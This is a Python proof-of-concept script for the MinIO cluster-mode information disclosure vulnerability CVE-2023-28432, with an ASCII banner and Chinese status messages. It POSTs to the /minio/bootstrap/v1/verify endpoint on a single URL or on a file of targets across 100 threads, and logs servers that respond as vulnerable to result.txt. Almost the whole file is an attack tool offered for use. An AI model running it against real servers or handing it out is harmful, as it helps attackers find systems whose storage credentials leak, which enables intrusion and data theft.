import requests,sys,re,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test="""
 $$$$$$\  $$\    $$\ $$$$$$$$\       $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\          $$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\   $$$$$$\  
$$  __$$\ $$ |   $$ |$$  _____|     $$  __$$\ $$$ __$$\ $$  __$$\ $$ ___$$\        $$  __$$\ $$  __$$\ $$ |  $$ |$$ ___$$\ $$  __$$\ 
$$ /  \__|$$ |   $$ |$$ |           \__/  $$ |$$$$\ $$ |\__/  $$ |\_/   $$ |       \__/  $$ |$$ /  $$ |$$ |  $$ |\_/   $$ |\__/  $$ |
$$ |      \$$\  $$  |$$$$$\ $$$$$$\  $$$$$$  |$$\$$\$$ | $$$$$$  |  $$$$$ /$$$$$$\  $$$$$$  | $$$$$$  |$$$$$$$$ |  $$$$$ /  $$$$$$  |
$$ |       \$$\$$  / $$  __|\______|$$  ____/ $$ \$$$$ |$$  ____/   \___$$\\______|$$  ____/ $$  __$$< \_____$$ |  \___$$\ $$  ____/ 
$$ |  $$\   \$$$  /  $$ |           $$ |      $$ |\$$$ |$$ |      $$\   $$ |       $$ |      $$ /  $$ |      $$ |$$\   $$ |$$ |      
\$$$$$$  |   \$  /   $$$$$$$$\      $$$$$$$$\ \$$$$$$  /$$$$$$$$\ \$$$$$$  |       $$$$$$$$\ \$$$$$$  |      $$ |\$$$$$$  |$$$$$$$$\ 
 \______/     \_/    \________|     \________| \______/ \________| \______/        \________| \______/       \__| \______/ \________|
                                                                                                                                     
                                                                                                                                     
                                                                                                                                     
"""



    print(test)



def main():
    banner()
    parser=argparse.ArgumentParser(description='MinIO集群模式信息泄露漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



def poc(target):
    url_payload= '/minio/bootstrap/v1/verify'
    headers={
        'Accept-Encoding':'gzip,deflate',
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/110.0.5481.178Safari/537.36',
        'Connection':'close',
        'Cache-Control':'max-age=0',
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'0'
    }


    try:
        res1=requests.post(url=target+url_payload,headers=headers,timeout=10)
        if res1.status_code==200:
            print( f"[+]{target} 存在漏洞！")
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')



if __name__ =='__main__':
    main()
